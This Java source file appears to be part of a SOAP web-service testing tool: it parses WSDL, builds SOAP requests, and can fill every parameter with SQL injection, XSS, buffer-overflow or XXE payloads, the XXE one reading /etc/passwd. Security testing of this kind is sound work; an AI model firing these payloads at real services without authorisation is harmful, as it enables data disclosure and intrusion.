package com.wsdlwizard;

import javax.wsdl.*;
import javax.wsdl.extensions.ExtensibilityElement;
import javax.wsdl.extensions.schema.Schema;
import javax.wsdl.factory.WSDLFactory;
import javax.wsdl.xml.WSDLReader;
import javax.xml.namespace.QName;
import java.io.StringReader;
import java.util.*;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;

public class WsdlParser {

    public static Definition parseWsdl(String wsdlContent) throws WSDLException {
        WSDLFactory factory = WSDLFactory.newInstance();
        WSDLReader reader = factory.newWSDLReader();
        reader.setFeature("javax.wsdl.verbose", false);
        reader.setFeature("javax.wsdl.importDocuments", true);
        return reader.readWSDL(null, new InputSource(new StringReader(wsdlContent)));
    }

    public static Definition parseWsdlFromUrl(String url) throws WSDLException {
        WSDLFactory factory = WSDLFactory.newInstance();
        WSDLReader reader = factory.newWSDLReader();
        reader.setFeature("javax.wsdl.verbose", false);
        reader.setFeature("javax.wsdl.importDocuments", true);
        return reader.readWSDL(url);
    }

    public enum AttackType {
        NORMAL, SQLI, XSS, XXE, OVERFLOW
    }

    public static List<String> getParameters(Operation operation) {
        List<String> params = new ArrayList<>();
        Input input = operation.getInput();
        if (input != null && input.getMessage() != null) {
            Map parts = input.getMessage().getParts();
            for (Object key : parts.keySet()) {
                Part part = (Part) parts.get(key);
                params.add(part.getName());
            }
        }
        return params;
    }

    public static String generateSoapRequest(Operation operation, String targetNamespace, Map<String, String> parameterValues) {
        StringBuilder soap = new StringBuilder();
        soap.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        soap.append("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"" + targetNamespace + "\">\n");
        soap.append("   <soapenv:Header/>\n");
        soap.append("   <soapenv:Body>\n");
        soap.append("      <web:" + operation.getName() + ">\n");

        Input input = operation.getInput();
        if (input != null && input.getMessage() != null) {
            Map parts = input.getMessage().getParts();
            for (Object key : parts.keySet()) {
                Part part = (Part) parts.get(key);
                String paramName = part.getName();
                String typeName = part.getTypeName() != null ? part.getTypeName().getLocalPart() : "string";
                
                String value;
                if (parameterValues.containsKey(paramName)) {
                    value = parameterValues.get(paramName);
                } else {
                    value = getSmartValue(typeName);
                }
                
                soap.append("         <!--Optional-->\n");
                soap.append("         <web:" + paramName + ">" + value + "</web:" + paramName + ">\n");
            }
        }

        soap.append("      </web:" + operation.getName() + ">\n");
        soap.append("   </soapenv:Body>\n");
        soap.append("</soapenv:Envelope>");
        return soap.toString();
    }

    public static String generateSoapRequest(Operation operation, String targetNamespace, AttackType attackType) {
        StringBuilder soap = new StringBuilder();
        
        if (attackType == AttackType.XXE) {
            soap.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
            soap.append("<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]>\n");
        } else {
            soap.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        }
        
        soap.append("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"" + targetNamespace + "\">\n");
        soap.append("   <soapenv:Header/>\n");
        soap.append("   <soapenv:Body>\n");
        soap.append("      <web:" + operation.getName() + ">\n");

        Input input = operation.getInput();
        if (input != null && input.getMessage() != null) {
            Map parts = input.getMessage().getParts();
            for (Object key : parts.keySet()) {
                Part part = (Part) parts.get(key);
                String typeName = part.getTypeName() != null ? part.getTypeName().getLocalPart() : "string";
                String value = getAttackValue(typeName, attackType);
                soap.append("         <!--Optional-->\n");
                soap.append("         <web:" + part.getName() + ">" + value + "</web:" + part.getName() + ">\n");
            }
        }

        soap.append("      </web:" + operation.getName() + ">\n");
        soap.append("   </soapenv:Body>\n");
        soap.append("</soapenv:Envelope>");
        return soap.toString();
    }
    public static String getEndpointUrl(Port port) {
        for (Object ext : port.getExtensibilityElements()) {
            if (ext instanceof javax.wsdl.extensions.soap.SOAPAddress) {
                return ((javax.wsdl.extensions.soap.SOAPAddress) ext).getLocationURI();
            } else if (ext instanceof javax.wsdl.extensions.soap12.SOAP12Address) {
                return ((javax.wsdl.extensions.soap12.SOAP12Address) ext).getLocationURI();
            } else if (ext instanceof javax.wsdl.extensions.http.HTTPAddress) {
                return ((javax.wsdl.extensions.http.HTTPAddress) ext).getLocationURI();
            } else {
                // Log unknown element for debugging
                System.out.println("Unknown extensibility element: " + ext.getClass().getName());
            }
        }
        return null;
    }

    private static String getAttackValue(String typeName, AttackType attackType) {
        if (attackType == AttackType.NORMAL) {
            return getSmartValue(typeName);
        }

        switch (attackType) {
            case SQLI:
                return "' OR '1'='1";
            case XSS:
                return "\"><script>alert(1)</script>";
            case XXE:
                return "&xxe;";
            case OVERFLOW:
                return "A".repeat(10000);
            default:
                return getSmartValue(typeName);
        }
    }

    private static String getSmartValue(String typeName) {
        String lowerType = typeName.toLowerCase();
        if (lowerType.contains("int") || lowerType.contains("long") || lowerType.contains("short")) {
            return "1337";
        } else if (lowerType.contains("string")) {
            return "test_string";
        } else if (lowerType.contains("bool")) {
            return "true";
        } else if (lowerType.contains("float") || lowerType.contains("double")) {
            return "123.45";
        } else if (lowerType.contains("date")) {
            return "2023-01-01";
        }
        return "?";
    }

    public static String getDocumentation(Operation operation) {
        Element docParams = operation.getDocumentationElement();
        if (docParams != null) {
            return docParams.getTextContent().trim();
        }
        return "No documentation available.";
    }
}
